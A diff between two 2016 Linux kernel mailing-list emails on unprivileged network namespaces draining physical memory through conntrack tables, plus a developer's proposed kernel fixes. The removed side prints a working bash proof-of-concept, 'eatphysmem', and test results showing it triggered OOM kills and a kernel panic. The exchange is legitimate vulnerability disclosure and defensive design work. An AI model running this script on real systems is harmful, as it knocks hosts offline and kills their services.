@@ -1,82 +1,47 @@
-From: yumkam@gmail.com (Yuriy M. Kaminskiy)
-Subject: Re: userns, netns, and quick physical memory consumption by unprivileged user
-Date: Fri, 11 Mar 2016 18:06:59 +0300
-Message-ID: <m3r3fhhx4c.fsf@gmail.com>
+From: Florian Westphal <fw@strlen.de>
+Subject: Re: userns, netns, and quick physical memory consumption by
+ unprivileged user
+Date: Fri, 11 Mar 2016 16:34:06 +0100
+Message-ID: <20160311153406.GB6620@breakpoint.cc>
 References: <m3d1rclioc.fsf@gmail.com>
+ <m3r3fhhx4c.fsf@gmail.com>
 Mime-Version: 1.0
-Content-Type: text/plain
-Return-path: <netdev-owner@vger.kernel.org>
-Sender: netdev-owner@vger.kernel.org
-To: netdev@vger.kernel.org
-Cc: containers@lists.osdl.org, linux-kernel@vger.kernel.org
+Content-Type: text/plain; charset=us-ascii
+Return-path: <linux-kernel-owner@vger.kernel.org>
+Content-Disposition: inline
+In-Reply-To: <m3r3fhhx4c.fsf@gmail.com>
+Sender: linux-kernel-owner@vger.kernel.org
+To: "Yuriy M. Kaminskiy" <yumkam@gmail.com>
+Cc: netdev@vger.kernel.org, containers@lists.osdl.org, linux-kernel@vger.kernel.org
 List-Id: containers.vger.kernel.org
 
-ping (+ more test results at bottom)
+Yuriy M. Kaminskiy <yumkam@gmail.com> wrote:
+> BTW, all those hash/conntrack/etc default sizes was calculated from
+> physical memory size in assumption there will be only *one* instance of
+> those tables. Obviously, introduction of network namespaces (and
+> especially unprivileged user-ns) thrown this assumption in the window
+> (and here comes that "falling back to vmalloc" message again; in pre-netns
+> world, those tables were allocated *once* on early system startup, with
+> typically plenty of free and unfragmented memory).
 
-On Wed, 02 Mar 2016, I wrote:
+No idea how to fix this expect by removing conntrack support in net
+namespaces completely.
 
-> While looking at CVE-2016-2847, I remembered about infamous
->     nf_conntrack: falling back to vmalloc
-> message, that was often triggered by network namespace creation (message
-> was removed recently, but it changed nothing with underlying problem).
->
-> So, how about something like this:
->
-> $ cat << EOF >> eatphysmem
-> #!/bin/bash -xe
-> fd=6
-> d="`mktemp -d /tmp/eatmemXXXXXXXXX`"
-> cd "$d"
-> rule="iptables -A INPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT"
-> # rule="$rule;$rule"
-> # ... just because we can; same with any number of ip li/ro/ru/etc
-> while :; do
->     let fd=fd+1
->     [ ! -e /proc/$$/fd/$fd ] || continue
->     mkfifo f1 f2
->     unshare -rn sh -xec "echo foo >f1;ip li se lo up; $rule;read r <f2" &
->     pid=$!
->     read r <f1
->     eval "exec $fd</proc/$pid/ns/net"
->     echo bar >f2
->     wait
->     rm f2 f1
->     free
->     sleep 0.1s
-> done
-> sleep inf
-> EOF
-> $ chmod a+x eatphysmem; unshare -rpf --mount-proc ./eatphysmem
-> ?
->
-> You can easily eat 0.5M physical memory per netns (conntrack hash table
-> (hashsize*sizeof(list_head))) and more, and pin them to single process
-> with opened netns fds.
-> What can stop it?
-> ulimit? What is ulimit? Conntrack knows nothing about them.
-> Ah-yeah, `ulimit -n`? 64k. 64k*512k = 32G. Per process. Oh-uh.
-> OOM killer? But this is not this process memory; if any, it will be
-> killed last.
-> (I wonder, if memcg can tackle it; probably yes; but how many people
-> have it configured?).
+I'd disallow all write accesses to skb->nfct (NAT, CONNMARK,
+CONNSECMARK, ...) and then no longer clear skb->nfct when forwarding
+packet from init_ns to container.
 
-I tested in vm with kernel 4.4.2 (from user account, with ulimit
--v 32768); as expected, it quickly eaten all memory, OOM killer went
-berserk and killed even systemd-journald and systemd-udevd, but left
-this process living (and hogging all physical memory; also note that
-swap was enabled - and mostly remained unused).
+Containers could then still test conntrack as seen from init namespace pov
+in PREROUTING/FORWARD/INPUT (but not OUTPUT, obviously).
 
-And also tried with memcg:
-  t=/sys/fs/cgroup/memory/test1;mkdir $t;echo 0 >$t/tasks;
-  echo 48M >$t/memory.limit_in_bytes; su testuser [...]
-and it has not helped at all (rather opposite, it ended up with killed
-init and kernel panic; well, later is pure (un)luck; but point is, memcg
-apparently *CANNOT* curb net/ns allocations).
+[ OUTPUT *might* be doable as well by allowing NEW creation in output
+  but skipping nat and deferring the confirmation/commit of the new
+  entry to the table until skb leaves initns ]
 
-BTW, all those hash/conntrack/etc default sizes was calculated from
-physical memory size in assumption there will be only *one* instance of
-those tables. Obviously, introduction of network namespaces (and
-especially unprivileged user-ns) thrown this assumption in the window
-(and here comes that "falling back to vmalloc" message again; in pre-netns
-world, those tables were allocated *once* on early system startup, with
-typically plenty of free and unfragmented memory).
+We could key conntrack entries to initns conntrack table
+instead of adding one new table per netns, but seems like this only
+replaces one problem with a new one (filling/blocking initns table from
+another netns).
+
+Maybe we could go with a compromise and skip/disallow conntrack in
+unpriv userns only?
